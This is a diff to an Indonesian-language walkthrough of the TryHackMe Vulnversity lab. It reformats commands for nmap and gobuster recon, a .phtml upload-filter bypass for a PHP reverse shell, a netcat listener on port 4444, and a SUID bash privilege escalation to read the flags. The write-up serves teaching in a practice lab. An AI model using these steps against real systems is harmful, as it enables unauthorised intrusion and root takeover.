@@ -3,8 +3,11 @@
 - IP Machine: 10.10.137.132
 
 ## Task 2 - Reconnaissance
-- Lakukan scanning dengan tool nmap menggunakan perintah: `nmap -sV -A <IP Machine>`
-
+- Lakukan port scanning dengan tool `nmap`
+```sh
+nmap -sV -A <IP Machine>
+```
+- Berikut adalah hasil dari port scanning
 ```sh
 ┌──(root㉿kali)-[/home/kali]
 └─# nmap -sV -A 10.10.137.132
@@ -109,7 +112,10 @@ Ubuntu
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%201.JPG)
 
-- Lakukan web directory brute force dengan gobuster dengan perintah `gobuster dir -u http://<IP_Machine>:3333 -w <wordlists>`
+- Lakukan pencarian halaman web tersembunyi dengan tool `gobuster`
+```sh
+gobuster dir -u http://<IP Machine>:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%202.JPG)
 
@@ -158,19 +164,26 @@ Ubuntu
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2010.JPG)
 
-- Jalankan serangan dengan menekan tombol Start attack dan tunggu hingga proses selesai. Hasilnya payload **.phtml** memiliki panjang response yang paling berbeda dan memiliki pesan **Success** dibagian Response yang menandakan bahwa format **.phtml** adalah format file yang diizinkan
+- Jalankan serangan dengan menekan tombol **Start attack** dan tunggu hingga proses selesai. Hasilnya payload **.phtml** memiliki panjang response yang paling berbeda dan memiliki pesan **Success** dibagian Response yang menandakan bahwa format **.phtml** adalah format file yang diizinkan
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2011.JPG)
 
-- Kita bisa menduplikasi file **php-reverse-shell.php** dan menamainya dengan **php-reverse-shell.phtml** dengan perintah `cp php-reverse-shell.php php-reverse-shell.phtml`
+- Kita bisa menduplikasi file **php-reverse-shell.php** dan menamainya dengan **php-reverse-shell.phtml**
+```sh
+cp php-reverse-shell.php php-reverse-shell.phtml
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2012.JPG)
 
-- Upload file **php-reverse-shell.php** ke halaman `http://<IP_Machine>:3333/internal` dan pastikan muncul pesan **Success**
+- Upload file **php-reverse-shell.phtml** ke halaman `http://<IP_Machine>:3333/internal` dan pastikan muncul pesan **Success**
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2013.JPG)
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2014.JPG)
 
+- Buka terminal baru dan buat listener netcat di port 4444 sesuai konfigurasi file **php-reverse-shell.php** diatas
+```sh
+nc -lnvp 4444
+```
 - Buka terminal dan jalankan netcat dengan perintah `nc -lnvp <port>`
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2015.JPG)
@@ -180,6 +193,10 @@ Ubuntu
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2016.JPG)
 
 - Di directory **/home** terdapat home directory bill. Navigasi ke directory **/home/bill** dan disana terdapat file **user.txt** sebagai user flag
+```sh
+cd /home/bill
+cat user.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2017.JPG)
 
@@ -231,10 +248,16 @@ systemctl enable --now $TF
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2020.JPG)
 
 - Jalankan bash dengan perintah `bash -p` setelah itu ketik `id` maka kita berhasil mendapatkan akses root
+```sh
+bash -p
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2021.JPG)
 
-- Sekarang kita tinggal membaca file **root.txt** sebagai root flag dengan perintah `cat /root/root.txt`
+- Buka root flag yang berada di di direktori **/root**
+```sh
+cat /root/root.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2022.JPG)
 
